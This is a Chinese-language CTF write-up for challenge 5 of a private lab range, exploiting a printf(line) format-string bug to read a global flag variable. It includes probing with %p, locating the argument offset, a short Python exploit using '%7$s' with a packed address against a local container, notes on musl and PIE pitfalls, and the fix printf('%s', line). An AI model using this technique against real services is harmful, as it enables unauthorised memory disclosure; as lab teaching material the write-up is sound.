---
title: range-v1 第 5 题：格式串读全局 flag
date: 2026-11-28 11:14:00
author: Xendr1a
categories: [CTF题解, range-v1]
tags: [range-v1, Pwn, 格式化字符串, Writeup]
description: 私人靶场链 range-v1 第 5 题：printf(line) 的格式串可控，%7$s 从全局变量 flag 处读串。
toc: true
---
## 环境

`debian:12-slim` + socat，容器内 31337 起 `/app/chall`，本地 `127.0.0.1:12005`。编译参数 `gcc -O0 -fno-stack-protector -no-pie`。

flag 是全局变量，不是环境变量。`nm` 能直接看到：

```console
$ nm dist/chall | grep ' flag$'
0000000000404080 b flag
```

漏洞在 `printf(line)`——格式串由输入控制。

## 先确认格式串可控

```console
$ printf '%%p\n' | nc -q1 127.0.0.1 12005
=== r5-fmt-rce ===
留下你的名字，服务器负责回显：
你好，0x7ffce8129350
```

`%p` 打出了栈地址，泄漏成立。

## 找参数位

把 `Z%02d%N$pZ` 逐行发过去，比对小端值，看缓冲区落在参数表第几位：

```text
matches: [(6, '你好，Z060x5a7024362536305aZ')]
sample: ['你好，Z010x7ffe8d527010Z', '你好，Z02(nil)Z', '你好，Z03(nil)Z',
         '你好，Z040x288e82c4Z', '你好，Z05(nil)Z', '你好，Z060x5a7024362536305aZ']
```

第 6 个参数位就是缓冲区开头的 8 字节。缓冲区偏移 8 处即第 7 位——地址放这里。

## 打通

地址里有 NUL，不能放在前面：`printf` 会在格式串处就截断。正确姿势是 `%7$s` 在前，地址接在偏移 8：

```console
$ python3 - <<'PY'
import socket, struct
p = b"%7$sAAAA" + struct.pack("<Q", 0x404080)
s = socket.create_connection(("127.0.0.1", 12005)); s.recv(4096)
s.sendall(p + b"\n"); print(s.recv(4096).decode("utf-8", "replace"))
PY
你好，flag{range_v1_r5-fmt-rce}AAAA<地址字节>
```

平台冒烟：

```console
$ toolkit test-challenge ~/ctf/challenges/range-v1/r5-fmt-rce | tail -2
✓ 端口 182xx 已连通（容器内 31337）
✓ 通过：起得来、端口通（未解题验证）
```

## 踩坑

**musl 打不了这套。** 第一版镜像用 alpine，`%p` 和 `%1$p` 打出来都是 `0`——va_list 初始区没有可用的栈值。同样源码换 glibc 才有泄漏，换成 `debian:12-slim` 后一次成功。

**alpine 的 gcc 默认 PIE。** `readelf -h` 显示 `DYN`，`nm` 给的 `0x4080` 不是运行时地址。必须显式 `-no-pie`，否则得先泄 PIE 基址。

**参数位跟着 libc 版本走。** debian 12 / glibc 2.36 实测是 6/7，换基础镜像要重新确认 `%6$p`。

**socat 起的子进程继承容器 env。** 本地 compose 注入 `FLAG`，GZCTF 上是 `GZCTF_FLAG`，两边都吃。

## 复盘

格式串可控 + 全局变量 + 没开 PIE，三个条件凑齐就是送分。修法很干脆：别把用户输入当格式串，`printf("%s", line)`。

真正耗时间的是环境，不是利用——musl 和 PIE 各坑了一次。靶场写题时这两条应该写进模板默认值，省得下一题再踩。
